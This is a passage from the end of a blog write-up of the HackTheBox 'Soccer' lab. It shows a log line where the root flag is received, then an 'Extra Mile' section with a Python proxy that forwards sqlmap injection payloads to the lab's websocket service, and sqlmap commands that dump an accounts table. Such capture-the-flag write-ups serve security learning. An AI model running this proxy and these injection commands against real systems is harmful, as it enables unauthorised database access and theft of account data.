</span></span><span style="display:flex;"><span>::ffff:10.10.11.194 - - [29/May/2023 17:22:07] <span style="color:#0086d2">&#34;GET /3927&lt;redacted&gt;ac1 HTTP/1.1&#34;</span> <span style="color:#0086f7;font-weight:bold">404</span> - <span style="color:#080;background-color:#0f140f;font-style:italic">### Root flag here</span>
</span></span></code></pre></div><h1 id="extra-mile">Extra Mile</h1>
<h2 id="exploiting-sql-injection-with-sqlmap">Exploiting SQL Injection with SQLMap</h2>
<p>It is very common to exploit SQL Injection attacks with <code>SQLMap</code>, it is indeed a very powerful tool but by default does not support websockets by default, you must install python&rsquo;s <code>websocket-client</code>. We can exploit it in two ways:</p>
<ol>
<li>Creating a proxy server that forwards the http requests to the websocket server.</li>
</ol>
<p>The script below starts a local http server that takes the sqlmap payload, forwards it to the websocket service and returns its response</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">import</span> rich, json
</span></span><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">from</span> http.server <span style="color:#fb660a;font-weight:bold">import</span> BaseHTTPRequestHandler,HTTPServer
</span></span><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">import</span> urllib.parse
</span></span><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">from</span> websocket <span style="color:#fb660a;font-weight:bold">import</span> create_connection
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">class</span> GetHandler(BaseHTTPRequestHandler):
</span></span><span style="display:flex;"><span>    <span style="color:#fb660a;font-weight:bold">def</span> <span style="color:#ff0086;font-weight:bold">do_GET</span>(self):
</span></span><span style="display:flex;"><span>        <span style="color:#080;background-color:#0f140f;font-style:italic"># Get rid of the favicon request</span>
</span></span><span style="display:flex;"><span>        <span style="color:#fb660a;font-weight:bold">if</span> self.path == <span style="color:#0086d2">&#39;/favicon.ico&#39;</span>:
</span></span><span style="display:flex;"><span>            self.send_response(<span style="color:#0086f7;font-weight:bold">200</span>)
</span></span><span style="display:flex;"><span>            self.send_header(<span style="color:#0086d2">&#39;Content-Type&#39;</span>, <span style="color:#0086d2">&#39;image/x-icon&#39;</span>)
</span></span><span style="display:flex;"><span>            self.send_header(<span style="color:#0086d2">&#39;Content-Length&#39;</span>, <span style="color:#0086f7;font-weight:bold">0</span>)
</span></span><span style="display:flex;"><span>            self.end_headers()
</span></span><span style="display:flex;"><span>            <span style="color:#fb660a;font-weight:bold">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#080;background-color:#0f140f;font-style:italic"># parse SQLMAP payload</span>
</span></span><span style="display:flex;"><span>        <span style="color:#fb660a;font-weight:bold">try</span>:
</span></span><span style="display:flex;"><span>            payload = urllib.parse.urlparse(self.path)
</span></span><span style="display:flex;"><span>            payload = payload.query[<span style="color:#0086f7;font-weight:bold">2</span>:]
</span></span><span style="display:flex;"><span>            payload = urllib.parse.unquote(payload)
</span></span><span style="display:flex;"><span>        <span style="color:#fb660a;font-weight:bold">except</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#fb660a;font-weight:bold">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        response = self.send_payload(payload)
</span></span><span style="display:flex;"><span>        self.send_response(<span style="color:#0086f7;font-weight:bold">200</span>)
</span></span><span style="display:flex;"><span>        self.end_headers()
</span></span><span style="display:flex;"><span>        <span style="color:#080;background-color:#0f140f;font-style:italic"># Write the output on the webpage</span>
</span></span><span style="display:flex;"><span>        self.wfile.write(str.encode(response))
</span></span><span style="display:flex;"><span>        <span style="color:#fb660a;font-weight:bold">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#080;background-color:#0f140f;font-style:italic"># Send the payload to the websocket server</span>
</span></span><span style="display:flex;"><span>    <span style="color:#fb660a;font-weight:bold">def</span> <span style="color:#ff0086;font-weight:bold">send_payload</span>(self, payload):
</span></span><span style="display:flex;"><span>        ws = create_connection(<span style="color:#0086d2">&#34;ws://soccer.htb:9091/&#34;</span>)
</span></span><span style="display:flex;"><span>        data = {<span style="color:#0086d2">&#34;id&#34;</span>: <span style="color:#0086d2">f</span><span style="color:#0086d2">&#34;</span><span style="color:#0086d2">{</span>payload<span style="color:#0086d2">}</span><span style="color:#0086d2">&#34;</span>}
</span></span><span style="display:flex;"><span>        ws.send(json.dumps(data))
</span></span><span style="display:flex;"><span>        response = ws.recv()
</span></span><span style="display:flex;"><span>        ws.close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        rich.print(<span style="color:#0086d2">f</span><span style="color:#0086d2">&#34;Proxying: </span><span style="color:#0086d2">{</span>data<span style="color:#0086d2">}</span><span style="color:#0086d2">&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#fb660a;font-weight:bold">return</span> response
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#fb660a;font-weight:bold">def</span> <span style="color:#ff0086;font-weight:bold">log_message</span>(self, format, *args):
</span></span><span style="display:flex;"><span>        <span style="color:#fb660a;font-weight:bold">return</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">if</span> __name__ == <span style="color:#0086d2">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    rich.print(<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\n</span><span style="color:#0086d2"> =========== STARTING PROXY ===========&#34;</span>)
</span></span><span style="display:flex;"><span>    server = HTTPServer((<span style="color:#0086d2">&#39;localhost&#39;</span>, <span style="color:#0086f7;font-weight:bold">8080</span>), GetHandler)
</span></span><span style="display:flex;"><span>    rich.print(<span style="color:#0086d2">&#39;</span><span style="color:#0086d2">\n</span><span style="color:#0086d2">Starting server at http://localhost:8080</span><span style="color:#0086d2">\n</span><span style="color:#0086d2">&#39;</span>)
</span></span><span style="display:flex;"><span>    server.serve_forever()
</span></span></code></pre></div><p>Now, all we have to do is point the <code>sqlmap</code> to <code>http://localhost:8080</code> and exploit it normally</p>
<p><code>sqlmap -u &quot;http://localhost:8080/?p=*&quot; --level 5 --risk 3 --technique=B -T accounts --dump</code></p>
<p><img src="/soccer-img/sqlmap.png" alt="img13"></p>
<ol start="2">
<li>Run directly on SQLMap&rsquo;s cli: <code>sqlmap -u &quot;ws://soccer.htb:9091&quot; --data '{&quot;id&quot;: &quot;1234&quot;}' --dbs</code> also works!</li>
</ol>
<p>That&rsquo;s all folks ğŸ°</p>

		</section>

		<div class="post-tags">
			
			
			<nav class="nav tags">
				<ul class="tags">
					
					<li><a href="/tags/hackthebox">hackthebox</a></li>
					
					<li><a href="/tags/easy">easy</a></li>
					
					<li><a href="/tags/sqlinjection">sqlinjection</a></li>
					
					<li><a href="/tags/websockets">websockets</a></li>
					
					<li><a href="/tags/tiny">tiny</a></li>
					
				</ul>
			</nav>
			
			
		</div>
		</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/D4n-P" rel="me" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a><a class="soc" href="https://twitter.com/dan_ps__" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
    <a class="border"></a><a class="soc" href="https://www.linkedin.com/in/danielspatricio/" rel="me" title="Linkedin"><i data-feather="linkedin"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    Feel free to reach me at any of my social media ğŸƒ
  </div>
</footer>


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-164145585-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>

<script>
  feather.replace()
</script></div>
    </body>
</html>
